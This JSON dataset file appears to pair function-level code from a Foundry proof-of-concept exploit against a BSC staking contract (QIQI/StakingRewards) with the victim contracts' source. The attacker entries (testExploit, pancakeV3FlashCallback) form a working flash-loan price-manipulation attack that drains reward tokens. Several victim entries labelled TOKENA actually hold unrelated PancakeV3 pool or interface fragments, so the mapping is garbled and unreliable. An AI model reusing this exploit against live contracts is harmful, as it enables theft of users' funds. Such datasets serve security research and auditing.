[
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "IS_TEST",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "excludeArtifacts",
    "original_code": "    function excludeArtifacts() public view returns (string[] memory excludedArtifacts_) {\n        excludedArtifacts_ = _excludedArtifacts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "excludeContracts",
    "original_code": "    function excludeContracts() public view returns (address[] memory excludedContracts_) {\n        excludedContracts_ = _excludedContracts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "excludeSenders",
    "original_code": "    function excludeSenders() public view returns (address[] memory excludedSenders_) {\n        excludedSenders_ = _excludedSenders;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "failed",
    "original_code": "    function failed() public view returns (bool) {\n        if (_failed) {\n            return _failed;\n        } else {\n            return vm.load(address(vm), bytes32(\"failed\")) != bytes32(0);\n        }\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "pancakeV3FlashCallback",
    "original_code": "    function pancakeV3FlashCallback(uint256 fee0, uint256 fee1, bytes calldata data) external {\n        QIQI.approve(address(Router), QIQI.balanceOf(address(this)));\n        TokenA.approve(address(Router), TokenA.balanceOf(address(this)));\n        Router.addLiquidity(\n            address(QIQI),\n            address(TokenA),\n            QIQI.balanceOf(address(this)),\n            TokenA.balanceOf(address(this)),\n            0,\n            0,\n            address(this),\n            block.timestamp\n        );\n        claimFactory(10);\n        pair = Uni_Pair_V2(Factory.getPair(address(QIQI), address(TokenA)));\n        pair.approve(address(Router), pair.balanceOf(address(this)));\n        Router.removeLiquidity(\n            address(QIQI), address(TokenA), pair.balanceOf(address(this)), 0, 0, address(this), block.timestamp\n        );\n        QIQI.transfer(address(Pair), 10_100 * 1e18);\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "setUp",
    "original_code": "    function setUp() public {\n        cheats.createSelectFork(\"bsc\", 28_187_317);\n        cheats.label(address(USDT), \"USDT\");\n        cheats.label(address(QIQI), \"QIQI\");\n        cheats.label(address(SELLC), \"SELLC\");\n        cheats.label(address(Pair), \"Pair\");\n        cheats.label(address(Router), \"Router\");\n        cheats.label(address(Factory), \"Factory\");\n        cheats.label(address(StakingRewards), \"StakingRewards\");\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetArtifactSelectors",
    "original_code": "    function targetArtifactSelectors() public view returns (FuzzSelector[] memory targetedArtifactSelectors_) {\n        targetedArtifactSelectors_ = _targetedArtifactSelectors;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetArtifacts",
    "original_code": "    function targetArtifacts() public view returns (string[] memory targetedArtifacts_) {\n        targetedArtifacts_ = _targetedArtifacts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetContracts",
    "original_code": "    function targetContracts() public view returns (address[] memory targetedContracts_) {\n        targetedContracts_ = _targetedContracts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetInterfaces",
    "original_code": "    function targetInterfaces() public view returns (FuzzInterface[] memory targetedInterfaces_) {\n        targetedInterfaces_ = _targetedInterfaces;\n    }\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetSelectors",
    "original_code": "    function targetSelectors() public view returns (FuzzSelector[] memory targetedSelectors_) {\n        targetedSelectors_ = _targetedSelectors;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetSenders",
    "original_code": "    function targetSenders() public view returns (address[] memory targetedSenders_) {\n        targetedSenders_ = _targetedSenders;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "testExploit",
    "original_code": "    function testExploit() public {\n        deal(address(USDT), address(this), 1000 * 1e18);\n        stakeFactory(10);\n\n        cheats.warp(block.timestamp + 60 * 60);\n\n        TokenA = new TOKENA();\n        TokenA.mint(100);\n        Pair.flash(address(this), 10_000 * 1e18, 0, new bytes(1));\n\n        emit log_named_decimal_uint(\n            \"Attacker QIQI balance after exploit\", QIQI.balanceOf(address(this)), QIQI.decimals()\n        );\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "TOKENA",
    "source_type": "victim_contract",
    "function_name": "allowance",
    "original_code": "    function allowance(address owner, address spender) public view virtual override returns (uint256) {\n        return _allowances[owner][spender];\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "TOKENA",
    "source_type": "victim_contract",
    "function_name": "approve",
    "original_code": "    function approve(address spender, uint256 amount) public virtual override returns (bool) {\n        _approve(_msgSender(), spender, amount);\n        return true;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "TOKENA",
    "source_type": "victim_contract",
    "function_name": "balanceOf",
    "original_code": "    function balanceOf(address account) public view virtual override returns (uint256) {\n        return _balances[account];\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "TOKENA",
    "source_type": "victim_contract",
    "function_name": "burn",
    "original_code": "    function burn(\n        int24 tickLower,\n        int24 tickUpper,\n        uint128 amount\n    ) external override lock returns (uint256 amount0, uint256 amount1) {\n        (Position.Info storage position, int256 amount0Int, int256 amount1Int) = _modifyPosition(\n            ModifyPositionParams({\n                owner: msg.sender,\n                tickLower: tickLower,\n                tickUpper: tickUpper,\n                liquidityDelta: -int256(amount).toInt128()\n            })\n        );\n\n        amount0 = uint256(-amount0Int);\n        amount1 = uint256(-amount1Int);\n\n        if (amount0 > 0 || amount1 > 0) {\n            (position.tokensOwed0, position.tokensOwed1) = (\n                position.tokensOwed0 + uint128(amount0),\n                position.tokensOwed1 + uint128(amount1)\n            );\n        }\n\n        emit Burn(msg.sender, tickLower, tickUpper, amount, amount0, amount1);\n    }\n\n    struct SwapCache {\n        // the protocol fee for the input token\n        uint32 feeProtocol;\n        // liquidity at the beginning of the swap\n        uint128 liquidityStart;\n        // the timestamp of the current block\n        uint32 blockTimestamp;\n        // the current value of the tick accumulator, computed only if we cross an initialized tick\n        int56 tickCumulative;\n        // the current value of seconds per liquidity accumulator, computed only if we cross an initialized tick\n        uint160 secondsPerLiquidityCumulativeX128;\n        // whether we've computed and cached the above two accumulators\n        bool computedLatestObservation;\n    }\n\n    // the top level state of the swap, the results of which are recorded in storage at the end\n    struct SwapState {\n        // the amount remaining to be swapped in/out of the input/output asset\n        int256 amountSpecifiedRemaining;\n        // the amount already swapped out/in of the output/input asset\n        int256 amountCalculated;\n        // current sqrt(price)\n        uint160 sqrtPriceX96;\n        // the tick associated with the current price\n        int24 tick;\n        // the global fee growth of the input token\n        uint256 feeGrowthGlobalX128;\n        // amount of input token paid as protocol fee\n        uint128 protocolFee;\n        // the current liquidity in range\n        uint128 liquidity;\n    }\n\n    struct StepComputations {\n        // the price at the beginning of the step\n        uint160 sqrtPriceStartX96;\n        // the next tick to swap to from the current tick in the swap direction\n        int24 tickNext;\n        // whether tickNext is initialized or not\n        bool initialized;\n        // sqrt(price) for the next tick (1/0)\n        uint160 sqrtPriceNextX96;\n        // how much is being swapped in in this step\n        uint256 amountIn;\n        // how much is being swapped out\n        uint256 amountOut;\n        // how much fee is being paid in\n        uint256 feeAmount;\n    }\n\n    /// @inheritdoc IPancakeV3PoolActions\n",
    "description": ""
  },
  {
    "contract/interface": "TOKENA",
    "source_type": "victim_contract",
    "function_name": "decimals",
    "original_code": "    function decimals() public view virtual override returns (uint8) {\n        return 18;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "TOKENA",
    "source_type": "victim_contract",
    "function_name": "mint",
    "original_code": "    function mint(\n        address recipient,\n        int24 tickLower,\n        int24 tickUpper,\n        uint128 amount,\n        bytes calldata data\n    ) external override lock returns (uint256 amount0, uint256 amount1) {\n        require(amount > 0);\n        (, int256 amount0Int, int256 amount1Int) = _modifyPosition(\n            ModifyPositionParams({\n                owner: recipient,\n                tickLower: tickLower,\n                tickUpper: tickUpper,\n                liquidityDelta: int256(amount).toInt128()\n            })\n        );\n\n        amount0 = uint256(amount0Int);\n        amount1 = uint256(amount1Int);\n\n        uint256 balance0Before;\n        uint256 balance1Before;\n        if (amount0 > 0) balance0Before = balance0();\n        if (amount1 > 0) balance1Before = balance1();\n        IPancakeV3MintCallback(msg.sender).pancakeV3MintCallback(amount0, amount1, data);\n        if (amount0 > 0) require(balance0Before.add(amount0) <= balance0(), 'M0');\n        if (amount1 > 0) require(balance1Before.add(amount1) <= balance1(), 'M1');\n\n        emit Mint(msg.sender, recipient, tickLower, tickUpper, amount, amount0, amount1);\n    }\n\n    /// @inheritdoc IPancakeV3PoolActions\n",
    "description": ""
  },
  {
    "contract/interface": "TOKENA",
    "source_type": "victim_contract",
    "function_name": "name",
    "original_code": "    function name() public view virtual override returns (string memory) {\n        return _name;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "TOKENA",
    "source_type": "victim_contract",
    "function_name": "symbol",
    "original_code": "    function symbol() public view virtual override returns (string memory) {\n        return _symbol;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "TOKENA",
    "source_type": "victim_contract",
    "function_name": "totalSupply",
    "original_code": "    function totalSupply() public view virtual override returns (uint256) {\n        return _totalSupply;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "TOKENA",
    "source_type": "victim_contract",
    "function_name": "transfer",
    "original_code": "    function transfer(address recipient, uint256 amount) public virtual override returns (bool) {\n        _transfer(_msgSender(), recipient, amount);\n        return true;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "TOKENA",
    "source_type": "victim_contract",
    "function_name": "transferFrom",
    "original_code": "    function transferFrom(\n        address sender,\n        address recipient,\n        uint256 amount\n    ) external returns (bool);\n\n    /// @notice Event emitted when tokens are transferred from one address to another, either via `#transfer` or `#transferFrom`.\n    /// @param from The account from which the tokens were sent, i.e. the balance decreased\n    /// @param to The account to which the tokens were sent, i.e. the balance increased\n    /// @param value The amount of tokens that were transferred\n    event Transfer(address indexed from, address indexed to, uint256 value);\n\n    /// @notice Event emitted when the approval amount for the spender of a given owner's tokens changes.\n    /// @param owner The account that approved spending of its tokens\n    /// @param spender The account for which the spending allowance was modified\n    /// @param value The new allowance from the owner to the spender\n    event Approval(address indexed owner, address indexed spender, uint256 value);\n}\n",
    "description": ""
  },
  {
    "contract/interface": "IStakingRewards",
    "source_type": "victim_contract",
    "function_name": "claim",
    "original_code": "    function claim(address token,address token1) public    {\n        require(listToken[token]);\n        require(users[token][msg.sender].mnu > 0);\n        require(block.timestamp > stakedOfTime[token][msg.sender]);\n        uint minit=block.timestamp-stakedOfTime[token][msg.sender];\n        uint coin;\n        for(uint i=0;i< users[token][msg.sender].mnu;i++){\n            if(stakedOfTimeSum[token][msg.sender][i+1] > minit && stakedOf[token][msg.sender][i+1] >0){\n            uint banOf=stakedOf[token][msg.sender][i+1] / 100;\n            uint send=getTokenPrice(token1,token,banOf) / RATE_DAY;\n              coin+=minit*send;\n              stakedOfTimeSum[token][msg.sender][i+1]-=minit;\n            }\n        }\n        bool isok=IERC20(token).transfer(msg.sender,coin*50/100);\n        require(isok);\n        stakedOfTime[token][msg.sender]=block.timestamp;\n        updateU(token,msg.sender,coin*50/100);\n    }\n",
    "description": ""
  },
  {
    "contract/interface": "IStakingRewards",
    "source_type": "victim_contract",
    "function_name": "stake",
    "original_code": "    function stake(address token,address token1,address token2,address up,uint amount) external{\n        require(users[token][up].tz > 0 || msg.sender == owner());\n        if(token2 == SELLC){\n            require(getTokenPriceUs(amount) >= 100 ether );\n        }else {\n           require(amount >= 100 ether ); \n        }\n        require(token2 == USDT || token2==SELLC);\n        require(listToken[token]);\n        require(token1== USDT || token1==SELLC);\n        address pair=ISwapFactory(IRouters.factory()).getPair(token,token1);\n        require(pair!=address(this));\n        require(amount > 0,\"amount can not be 0\");\n        bool isok=IERC20(token2).transferFrom(msg.sender, address(this), amount);\n        require(isok);\n        uint SELL=amount;\n        if(token1 == SELLC && token2 ==USDT){\n          uint sellcx=_buySellc(amount);\n          require(sellcx > 0);\n           SELL=sellcx;\n        }\n        if(stakedOfTime[token][msg.sender] ==0){\n           stakedOfTime[token][msg.sender]=block.timestamp;\n        }else {\n           claim(token,token1);\n        }\n        users[token][msg.sender].mnu++;\n        IERC20(token1).transfer(auditor,SELL * 2 / 100);\n        IERC20(token1).transfer(TokenOwner[token],SELL * 1 / 100);\n        //TokenOwner[_token]\n      uint buyToken=_buy(token1,token,SELL * 49 / 100);\n      require(buyToken > 0);\n        _addL(token,token1,buyToken,SELL*48/100,address(this));       \n        stakedOfTimeSum[token][msg.sender][users[token][msg.sender].mnu]=RATE_DAY * 365;\n        stakedOf[token][msg.sender][users[token][msg.sender].mnu] += SELL;\n        stakedSum[token][address(this)]+=SELL;\n        if(upaddress[msg.sender] == address(0) && up != msg.sender){\n           upaddress[msg.sender]=up;\n           usersAddr[up].arrs.push(msg.sender);\n        }\n        users[token][msg.sender].tz+=SELL;\n    }\n",
    "description": ""
  }
]